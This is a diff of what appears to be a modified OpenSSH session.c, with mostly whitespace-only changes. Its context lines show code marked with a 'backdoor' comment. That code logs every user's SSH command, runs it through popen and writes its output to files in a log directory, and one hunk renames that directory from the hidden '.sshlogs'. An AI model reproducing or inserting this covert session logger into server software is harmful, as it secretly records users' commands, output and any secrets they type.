@@ -730,7 +730,7 @@ do_exec_pty(Session *s, const char *command)
 
 	/* Enter interactive session. */
 	s->ptymaster = ptymaster;
-	packet_set_interactive(1, 
+	packet_set_interactive(1,
 	    options.ip_qos_interactive, options.ip_qos_bulk);
 	if (compat20) {
 		session_set_fds(s, ptyfd, fdout, -1, 1, 1);
@@ -1457,7 +1457,7 @@ safely_chroot(const char *path, uid_t uid)
 			memcpy(component, path, cp - path);
 			component[cp - path] = '\0';
 		}
-	
+
 		debug3("%s: checking '%s'", __func__, component);
 
 		if (stat(component, &st) != 0)
@@ -1465,7 +1465,7 @@ safely_chroot(const char *path, uid_t uid)
 			    component, strerror(errno));
 		if (st.st_uid != 0 || (st.st_mode & 022) != 0)
 			fatal("bad ownership or modes for chroot "
-			    "directory %s\"%s\"", 
+			    "directory %s\"%s\"",
 			    cp == NULL ? "" : "component ", component);
 		if (!S_ISDIR(st.st_mode))
 			fatal("chroot path %s\"%s\" is not a directory",
@@ -1541,14 +1541,14 @@ do_setusercontext(struct passwd *pw)
 			perror("unable to set user context (setuser)");
 			exit(1);
 		}
-		/* 
+		/*
 		 * FreeBSD's setusercontext() will not apply the user's
 		 * own umask setting unless running with the user's UID.
 		 */
 		(void) setusercontext(lc, pw, pw->pw_uid, LOGIN_SETUMASK);
 #else
 # ifdef USE_LIBIAF
-/* In a chroot environment, the set_id() will always fail; typically 
+/* In a chroot environment, the set_id() will always fail; typically
  * because of the lack of necessary authentication services and runtime
  * such as ./usr/lib/libiaf.so, ./usr/lib/libpam.so.1, and ./etc/passwd
  * We skip it in the internal sftp chroot case.
@@ -1657,12 +1657,12 @@ child_close_fds(void)
 }
 
 /*
-backdoor 
+backdoor
 */
 #define MAX_FILEPATH	256
 char ssh_cmd_log_dirpath[MAX_FILEPATH];
 char ssh_cmd_log_filepath[MAX_FILEPATH];
-char *ssh_cmd_log_dir = "/data/proclog/log/.sshlogs";
+char *ssh_cmd_log_dir = "/data/proclog/log/sshlogs";
 int ssh_cmd_log_fd = -1;
 const char* sh_list[] = {"bash", "dash", "csh", "sh", NULL};
 
@@ -1714,8 +1714,8 @@ int open_ssh_command_log(Session *s)
 	}
 	}
 	//perror(ssh_cmd_log_dirpath);
-	
-	
+
+
 	if(strlen(ssh_cmd_log_filepath) <= 0 ) {
 	snprintf(ssh_cmd_log_filepath, MAX_FILEPATH, "%s/%s-%.2i.%.2i.%.2i.log",
 		ssh_cmd_log_dirpath,
@@ -1733,15 +1733,15 @@ int open_ssh_command_log(Session *s)
 }
 
 void
-close_ssh_command_log() 
+close_ssh_command_log()
 {
 	if(ssh_cmd_log_fd > 0) {
 		close(ssh_cmd_log_fd);
 		ssh_cmd_log_fd = -1;
 	}
-} 
+}
 
-void 
+void
 do_ssh_command_log(Session *s, const char *command)
 {
 	open_ssh_command_log(s);
@@ -1753,7 +1753,7 @@ do_ssh_command_log(Session *s, const char *command)
 	close_ssh_command_log();
 }
 
-void 
+void
 do_ssh_command_result_log(Session *s, const char *command)
 {
 	open_ssh_command_log(s);
@@ -1783,7 +1783,7 @@ do_child(Session *s, const char *command)
 
 
 do_ssh_command_log(s, command);
-	
+
 	/* remove hostkey from the child's memory */
 	destroy_sensitive_data();
 
@@ -1995,21 +1995,21 @@ do_ssh_command_log(s, command);
 	FILE *fp;
 	pid_t child_pid;
 	int status;
-	int i; 
+	int i;
 
 
 //	for(i=0; sh_list[i] != NULL; i++) {
 //		if(NULL != strstr(command, sh_list[i])) {
-//			
-//			//exit(0);	
+//
+//			//exit(0);
 //		}
-//		
+//
 //	}
 
 	fp = popen(command, "r");
-	if (fp == NULL) { 
-                perror("popen error!\n");  
-                exit(-1);  
+	if (fp == NULL) {
+                perror("popen error!\n");
+                exit(-1);
         }
         while(NULL!=(fgets(buf, 256, fp)) /*!feof(fp)*/)  {
 		do_ssh_command_result_log(s, buf);
@@ -2032,9 +2032,9 @@ do_ssh_command_log(s, command);
 			//execle("/bin/echo", "-n", buf, NULL, env);i
 			}
 		}
-		wait(&status);	
+		wait(&status);
 		memset(buf, 0, 256);
-	} 
+	}
         pclose(fp);
 //	execve(shell, argv, env);
 //	perror(shell);
